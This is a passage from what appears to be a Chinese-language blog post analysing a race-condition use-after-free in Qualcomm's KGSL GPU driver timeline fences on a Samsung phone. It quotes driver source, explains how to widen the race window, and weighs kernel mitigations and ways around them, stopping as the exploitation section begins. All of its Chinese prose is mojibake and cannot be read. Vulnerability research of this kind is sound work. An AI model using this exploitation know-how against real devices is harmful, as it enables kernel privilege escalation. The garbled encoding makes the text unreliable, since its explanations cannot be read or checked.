ä¸­ç§»é™¤è¯¥<code>dma_fence</code>ã€‚</p>
<p>å½“å­˜å‚¨åœ¨ <code>kgsl_timeline::fences</code> ä¸­çš„ <code>dma_fence</code> çš„<code>refcount</code>å‡å°‘ä¸º0æ—¶ï¼Œæ–¹æ³• <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> è¢«è°ƒç”¨ï¼Œä»¥ä» <code>kgsl_timeline::fences</code> ä¸­ç§»é™¤ <code>dma_fence</code> ï¼Œç„¶åè°ƒç”¨ <code>dma_fence_free</code> æ–¹æ³•é‡Šæ”¾ <code>dma_fence</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timeline_fence_release</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the fence is still on the active list, remove it */</span></span><br><span class="line">    list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">        <span class="keyword">if</span> (f != cur)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        list_del_init(&amp;f-&gt;node);    <span class="comment">//&lt;----- 1. Remove fence</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">    ...</span><br><span class="line">    kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">    dma_fence_free(fence);     <span class="comment">//&lt;-------    2.  frees the fence</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°½ç®¡ç§»é™¤æ“ä½œè¢«<code>timeline-&gt;fence_lock</code>æ‰€ä¿æŠ¤ï¼Œ<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L515"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>ä»ç„¶å¯ä»¥åœ¨ <code>dma_fence</code> çš„<code>refcount</code>å‡å°‘ä¸º0æ—¶ï¼Œä» <code>fences</code> ä¸­ç§»é™¤å‰ï¼Œè·å–å®ƒçš„ä¸€ä¸ªå¼•ç”¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);  <span class="comment">//&lt;------------- a.</span></span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123; <span class="comment">//&lt;----- b.</span></span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>kgsl_ioctl_timeline_destroy</code>ä¸­ï¼Œé”€æ¯ä¸€ä¸ª<code>timeline</code>ä¹‹å‰ï¼Œå…ˆå°†<code>timeline-&gt;fences</code>ä¸­çš„<code>fences</code>æ‹·è´åˆ°<code>temp</code>ä¸­ï¼Œç„¶åä»<code>timeline-&gt;fences</code>ä¸­åˆ é™¤ï¼ˆaï¼‰ã€‚ç”±äº<code>timeline-&gt;fences</code>æ²¡æœ‰ä¿ç•™é¢å¤–çš„<code>fence</code>å¼•ç”¨ï¼Œ<code>refcount</code>å°†è¢«å¢åŠ ä»¥é˜»æ­¢å®ƒä»¬åœ¨<code>temp</code>ä¸­è¢«é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œè¿™é‡Œå¯¹ <code>timeline-&gt;fences</code> çš„æ“ä½œä¹Ÿå—åˆ°<code>timeline-&gt;fence_lock</code>çš„ä¿æŠ¤ã€‚ä½†æ˜¯ï¼Œå½“åˆ°è¾¾ï¼ˆaï¼‰æ—¶ï¼Œ<code>fence</code>çš„<code>refcount</code>å·²ç»ä¸º0äº†ï¼Œæ–¹æ³• <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> è¿˜æ²¡æœ‰å°†å…¶ä» <code>kgsl_timeline::fences</code> ä¸­ç§»é™¤æ—¶ï¼Œ <code>dma_fence</code> å°†è¢«ç§»åŠ¨åˆ°<code>temp</code>ä¸­ï¼Œå°½ç®¡æ­¤æ—¶å®ƒçš„å¼•ç”¨å¢åŠ äº†ï¼Œä½†æ˜¯ä¹Ÿå·²ç»æ™šäº†ï¼Œå› ä¸ºï¼Œéšåæ–¹æ³• <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> å°†ä» <code>kgsl_timeline::fences</code> ä¸­ç§»é™¤å®ƒï¼Œæ— è®º<code>refcount</code>çš„å€¼æ˜¯å¤šå°‘ã€‚æŒ‰ç…§ä»¥ä¸‹æµç¨‹ï¼ŒUAF å°†åœ¨ï¼ˆbï¼‰å¤„è§¦å‘ã€‚</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-1.webp" alt="Kernel-1"  />

<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™æ˜¯ç«äº‰çš„æµç¨‹ï¼Œé€šè¿‡åœ¨ <code>timeline-&gt;fence</code>ä¸­æ·»åŠ å¤§é‡çš„ <code>dma_fence</code> ï¼Œå¯ä»¥å¢åŠ <code>kgsl_ioctl_timeline_destroy</code>ä»£ç å—è¿è¡Œçš„æ—¶é—´ã€‚å¦‚æœåœ¨çº¿ç¨‹2ä¸­å°† <code>timeline-&gt;fence</code>ä¸­æœ€åä¸€ä¸ª <code>dma_fence</code> çš„<code>refcount</code>å‡å°‘ä¸º0ï¼ŒåŒæ—¶ä¿æŒçº¿ç¨‹1ç»§ç»­è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åœ¨çº¿ç¨‹1çš„ <code>dma_fence_get</code> å°†<code>refcount</code>åŠ 1å‰ï¼Œè°ƒç”¨ <code>timeline_fence_release</code> ã€‚å› ä¸ºçº¿ç¨‹2ä¹Ÿéœ€è¦ç­‰å¾… <code>timeline-&gt;fence_lock</code>ï¼Œå®ƒåªæœ‰ç­‰çº¿ç¨‹1ç»“æŸï¼Œæ‰èƒ½ä» <code>kgsl_timeline::fences</code> ä¸­ç§»é™¤ <code>dma_fence</code> ã€‚åˆ°é‚£æ—¶ï¼Œ <code>timeline-&gt;fence</code>ä¸­æ‰€æœ‰çš„ <code>dma_fence</code> éƒ½å·²ç»ç§»åŠ¨åˆ°<code>temp</code>ä¸­äº†ã€‚è¿™å°±æ„å‘³ç€ï¼Œå½“çº¿ç¨‹2è¿è¡Œæ—¶ï¼Œ <code>timeline-&gt;fence</code>æ˜¯ä¸€ä¸ªç©ºçš„é“¾è¡¨ï¼Œç„¶åæ‰§è¡Œæµç¨‹å°†å¾ˆå¿«åˆ°è¾¾ <code>dma_fence_free</code>ã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œåªè¦åœ¨ <code>timeline-&gt;fence</code>ä¸­æ”¾ç½®è¶³å¤Ÿçš„ <code>dma_fence</code> ï¼Œå¯ä»¥åœ¨<code>kgsl_ioctl_timeline_destroy</code>å°† <code>timeline-&gt;fence</code>ä¸­ <code>dma_fence</code> ç§»åŠ¨åˆ°<code>temp</code>çš„è¿‡ç¨‹ä¸­ï¼Œåˆ›é€ ä¸€ä¸ªå¾ˆå¤§çš„ç«äº‰çª—å£ï¼Œåªè¦å°† <code>timeline-&gt;fence</code>ä¸­æœ€åä¸€ä¸ª <code>dma_fence</code> çš„<code>refcount</code>å‡å°‘ä¸º0ï¼Œå°±å¯ä»¥è§¦å‘UAFã€‚</p>
<h1 id="ç¼“è§£æªæ–½"><a href="#ç¼“è§£æªæ–½" class="headerlink" title="ç¼“è§£æªæ–½"></a>ç¼“è§£æªæ–½</h1><p>åˆ©ç”¨è¿™ä¸ªbugå¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯ï¼Œæœ‰å¾ˆå¤šæ¼æ´ç¼“è§£æªæ–½ï¼Œ<a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/kcfi">kCFI</a> (Kernel Control Flow Integrity) å’Œ <a target="_blank" rel="noopener" href="https://android-developers.googleblog.com/2020/06/system-hardening-in-android-11.html">variable initialization</a> ï¼ˆè¿™äº›åœ¨4.xå†…æ ¸ä¸­æ˜¯å…³é—­çš„ï¼Œä½†æ˜¯5.xå†…æ ¸å…¨éƒ¨å¼€å¯äº†ï¼‰ï¼Œè¿˜æœ‰ <a target="_blank" rel="noopener" href="https://www.samsungknox.com/en">Samsung RKP (Realtime Kernel Protection)</a> ã€‚</p>
<h2 id="kCFI"><a href="#kCFI" class="headerlink" title="kCFI"></a>kCFI</h2><p><code>kCFI</code>å¯ä»¥è¯´æ˜¯æœ€å®¹æ˜“è¢«ç»•è¿‡çš„ç¼“è§£æªæ–½ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸ä¸‰æ˜Ÿç®¡ç†ç¨‹åºä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå®ƒä¿æŠ¤äº†å†…æ ¸ä¸­è®¸å¤šé‡è¦çš„å†…å­˜åŒºåŸŸã€‚<code>kCFI</code>é€šè¿‡é™åˆ¶åŠ¨æ€è°ƒç”¨ç‚¹å¯ä»¥ä½¿ç”¨å‡½æ•°ç­¾åè·³è½¬åˆ°çš„ä½ç½®æ¥é˜²æ­¢æ§åˆ¶æµè¢«åŠ«æŒã€‚ä¾‹å¦‚ï¼Œåœ¨å½“å‰çš„æ¼æ´ä¸­ï¼Œ<code>dma_fence</code>è¢«é‡Šæ”¾åï¼Œå‡½æ•°<code>dma_fence_signal_locked</code>è¢«è°ƒç”¨ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);       <span class="comment">//&lt;---- free&#x27;d fence is used</span></span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dma_fence_signal_locked</code>å°†è°ƒç”¨ <code>cur-&gt;func</code> ï¼Œè¯¥å‡½æ•°æ˜¯<code>fence-&gt;cb_list</code>åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;</span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ²¡æœ‰<code>kCFI</code>çš„è¯ï¼Œå·²é‡Šæ”¾çš„ <code>fence</code> å°†å¯ä»¥è¢«<code>fake object</code>ä»£æ›¿ï¼Œæ„å‘³ç€ï¼ŒåŒ…æ‹¬<code>cb_list</code>å’Œ<code>func</code>ï¼Œæ‰€æœ‰éƒ½æ˜¯å‡çš„ã€‚åªè¦ç»•è¿‡äº†<code>KASLR</code>ï¼Œåˆ©ç”¨å°±ååˆ†ç®€å•äº†ï¼Œå¦‚è¿™ä¸ª<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">åˆ©ç”¨</a>ã€‚ä½†æ˜¯ç”±äº<code>kCFI</code>ï¼Œç°åœ¨æ›¿æ¢<code>func</code>çš„å‡½æ•°ç±»å‹åªèƒ½ä¸º <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/include/linux/dma-fence.h#L118"><code>dma_fence_func_t</code></a>ã€‚</p>
<p>ä¹‹å‰æœ‰å…³äºå¦‚ä½•ç»•è¿‡ Samsung æ§åˆ¶æµå®Œæ•´æ€§æ ¡éªŒï¼ˆJOPP, jump-oriented programming preventionï¼‰çš„<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">æ–¹æ³•</a>ï¼Œä½†æ˜¯å¯¹<code>kCFI</code>æ²¡ä»€ä¹ˆä½œç”¨ï¼Œç»•è¿‡<code>kCFI</code>çš„å¸¸è§æ–¹æ³•æ˜¯é€šè¿‡<code>double free</code>å»åŠ«æŒé‡Šæ”¾çš„é“¾è¡¨ï¼Œç„¶åä½¿ç”¨<a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">Kernel Space Mirroring Attack (KSMA)</a>ï¼Œä½†æ˜¯ï¼Œè¿™ç§æ–¹æ³•éœ€è¦å¤§é‡çš„æ—¶é—´ï¼Œå¦‚[Three dark clouds over the Android kernel](<a target="_blank" rel="noopener" href="https://github.com/2freeman/Slides/blob/main/PoC-2020-Three">https://github.com/2freeman/Slides/blob/main/PoC-2020-Three</a> Dark clouds over the Android kernel.pdf) å’Œ <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf">Typhoon Mangkhut: One-click remote universal root formed with two vulnerabilities</a> ã€‚</p>
<p>è¿™ä¸ªbugä¹Ÿèƒ½æä¾›<code>double free</code>ï¼Œå°±æ˜¯å½“ <code>dma_fence_put</code> åœ¨ <code>fence</code> è¢«é‡Šæ”¾åè°ƒç”¨æ—¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base); </span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);       <span class="comment">//&lt;----- free&#x27;d fence can be freed again</span></span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°åšæ³•å‡å°‘äº†å‡ <code>fence</code> å¯¹è±¡çš„<code>refcount</code>ï¼Œå¯ä»¥æ§åˆ¶ä¸º1ï¼Œè¿™æ ·å‡ <code>fence</code> å°±ä¼šå†æ¬¡è¢«é‡Šæ”¾ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸èƒ½åº”ç”¨<code>KSMA</code>ï¼Œå› ä¸ºè¿™éœ€è¦è¦†ç›–<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/pgtable.h#L465"><code>swapper_pg_dir</code></a>æ•°æ®ç»“æ„ï¼Œè€Œè¿™ä¸ªç»“æ„æ˜¯å—ä¸‰æ˜Ÿç®¡ç†ç¨‹åºä¿æŠ¤çš„ã€‚</p>
<h2 id="Variable-initialization"><a href="#Variable-initialization" class="headerlink" title="Variable initialization"></a>Variable initialization</h2><p>ä»Android 11å¼€å§‹ï¼Œå†…æ ¸å¯ä»¥é€šè¿‡å¯ç”¨å„ç§å†…æ ¸æ„å»ºæ ‡å¿—æ¥å®ç°è‡ªåŠ¨å˜é‡åˆå§‹åŒ–ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹æ˜¯Z Flip3çš„æ„å»ºé…ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Memory initialization</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_PATTERN=y</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_ZERO=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_NONE is not set</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_ALL_PATTERN is not set</span></span><br><span class="line"><span class="string">CONFIG_INIT_STACK_ALL_ZERO=y</span></span><br><span class="line"><span class="string">CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_ON_FREE_DEFAULT_ON is not set</span></span><br><span class="line"><span class="comment"># end of Memory initialization</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç‰¹å¾é™¤äº†ä¿æŠ¤æœªåˆå§‹åŒ–çš„å˜é‡ä»¥å¤–ï¼Œè¿˜ä½¿å¾—æ›¿æ¢å¯¹è±¡å˜å¾—å›°éš¾ã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒä¸å†å¯èƒ½æ‰§è¡Œéƒ¨åˆ†å¯¹è±¡æ›¿æ¢ï¼Œå³åªæ›¿æ¢å¯¹è±¡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œå¯¹è±¡çš„å…¶ä½™éƒ¨åˆ†ä»ç„¶æœ‰æ•ˆã€‚å¦‚å †å–·ï¼Œ<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface, too</a>å°†ä¸å†å¯èƒ½ã€‚</p>
<p>è¿™ä¸ªç‰¹æ€§å°†ä½¿å¾—è¿™ä¸ªbugä¸èƒ½è¿›è¡Œå †å–·ã€‚</p>
<h2 id="kfree-rcu"><a href="#kfree-rcu" class="headerlink" title="kfree_rcu"></a>kfree_rcu</h2><p>è¿™ä¸æ˜¯ä¸€ä¸ªç¼“è§£æªæ–½ï¼Œä¹‹æ‰€ä»¥æï¼Œæ˜¯å› ä¸ºå®ƒæœ‰äº›ç±»ä¼¼å·²æå‡ºçš„ UAF ç¼“è§£æªæ–½çš„ä½œç”¨ã€‚è¿™ä¸ªbugä¸­ï¼Œ <code>fence</code> è¢« <code>dma_fence_free</code> é‡Šæ”¾ï¼Œä¸åŒäºå¸¸è§„çš„ <code>kfree</code>ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨ <code>kfree_rcu</code>ã€‚ç®€å•æ¥è¯´ï¼Œ<code>kfree_rcu</code>å¹¶ä¸ç›´æ¥é‡Šæ”¾æ‰å¯¹è±¡ï¼Œåªæ˜¯åœ¨é‡åˆ°æŸäº›æƒ…å†µæ—¶å†è¿›è¡Œé‡Šæ”¾ã€‚è¿™æœ‰ç‚¹åƒä¸€ä¸ªå»¶è¿Ÿé‡Šæ”¾ï¼Œåœ¨å¯¹è±¡è¢«é‡Šæ”¾çš„æ—¶é—´ä¸Šå¼•å…¥äº†ä¸€ä¸ªä¸ç¡®å®šæ€§ï¼ˆè¿™å’Œ <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/scudo">Scudo</a>åˆ†é…å™¨çš„UAFç¼“è§£æªæ–½ç±»ä¼¼ï¼‰ï¼Œè¿™ç§ä¸ç¡®å®šæ€§å¯¹è¿™ä¸ªbugçš„åˆ©ç”¨è¿˜æ˜¯å¾ˆæœ‰é˜»ç¢ï¼ˆç«äº‰çª—å£å¾ˆç´§å¼ ï¼‰çš„ã€‚</p>
<p>ç„¶è€Œï¼Œæœ‰è®¸å¤šæ“çºµç«äº‰çª—å£å¤§å°çš„åŸè¯­ï¼Œæ¯”å¦‚<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clockâ€”hitting a tiny kernel race window</a>å’Œ[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)ä¸­çš„æŠ€æœ¯ï¼Œï¼ˆä¸¤è€…éƒ½æ˜¯ç”±Jann Hornç¼–å†™çš„ï¼Œè¾ƒæ—©çš„æŠ€æœ¯è¢«ç”¨äºåˆ©ç”¨å½“å‰çš„bugï¼‰ä»»ä½•ç´§å¼ çš„ç«äº‰çª—å£éƒ½å¯ä»¥è¢«åšå¾—è¶³å¤Ÿå¤§ï¼Œä»¥å…è®¸ç”±<code>kfree_rcu</code>å¼•èµ·çš„å»¶è¿Ÿï¼Œä»¥åŠéšåçš„å¯¹è±¡æ›¿æ¢ã€‚</p>
<h2 id="Samsung-RKP-Realtime-Kernel-Protection"><a href="#Samsung-RKP-Realtime-Kernel-Protection" class="headerlink" title="Samsung RKP (Realtime Kernel Protection)"></a>Samsung RKP (Realtime Kernel Protection)</h2><p><code>RKP</code>ä¿æŠ¤å†…å­˜ä¸è¢«å†™å…¥ï¼Œè¿™å¯ä»¥é˜²æ­¢è¿›ç¨‹è¦†ç›–è‡ªå·±çš„è¯ä¹¦æˆä¸º<code>root</code>ï¼Œä¹Ÿå¯ä»¥ä¿æŠ¤<code>SELinux</code>è®¾ç½®ä¸è¢«è¦†ç›–ã€‚å®ƒè¿˜å¯ä»¥é˜²æ­¢å†…æ ¸ä»£ç åŒºå’Œå…¶ä»–é‡è¦å¯¹è±¡ï¼Œå¦‚å†…æ ¸é¡µè¡¨ï¼Œè¢«è¦†ç›–ã€‚ä¸è¿‡åœ¨å®è·µä¸­ï¼Œä¸€æ—¦å®ç°äº†ä»»æ„çš„å†…æ ¸å†…å­˜è¯»å†™ï¼ˆå—<code>RKP</code>é™åˆ¶ï¼‰ï¼Œå°±æœ‰åŠæ³•ç»•è¿‡è¿™äº›é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œ<code>SELinux</code>è§„åˆ™å¯ä»¥é€šè¿‡è¦†ç›–<code>avc</code>ç¼“å­˜æ¥ä¿®æ”¹ï¼ˆä¾‹å¦‚ï¼Œè§Valentina Palmiottiçš„è¿™ä¸ª<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">åˆ©ç”¨</a>ï¼‰ï¼Œè€Œè·å¾—<code>root</code>å¯ä»¥é€šè¿‡<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">hijacking other processes that run as root</a>å®ç°ã€‚</p>
<p>åœ¨è¿™ä¸ªbugä¸­ï¼Œ<code>RKP</code>ä¸<code>kCFI</code>åˆä½œï¼Œé˜²æ­¢ä»»æ„å‡½æ•°è°ƒç”¨ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="Adding-dma-fence-to-timeline-fences"><a href="#Adding-dma-fence-to-timeline-fences" class="headerlink" title="Adding dma_fence to timeline-&gt;fences"></a>Adding <code>dma_fence</code> to <code>timeline-&gt;fences</code></h2><p>æœ‰ä¸¤ä¸ªé€‰é¡¹å¯ä»¥å°†<code>dma_fence</code>å¯¹è±¡æ·»åŠ åˆ°<code>kgsl_timeline</code>ä¸­ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä½¿ç”¨<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_fence_get</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    timeline = kgsl_timeline_by_id(device, param-&gt;timeline);</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timeline_fence_alloc(timeline, param-&gt;seqno); <span class="comment">//&lt;----- dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    sync_file = sync_file_create(fence);</span><br><span class="line">    <span class="keyword">if</span> (sync_file) &#123;</span><br><span class="line">        fd_install(fd, sync_file-&gt;file);</span><br><span class="line">        param-&gt;handle = fd;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

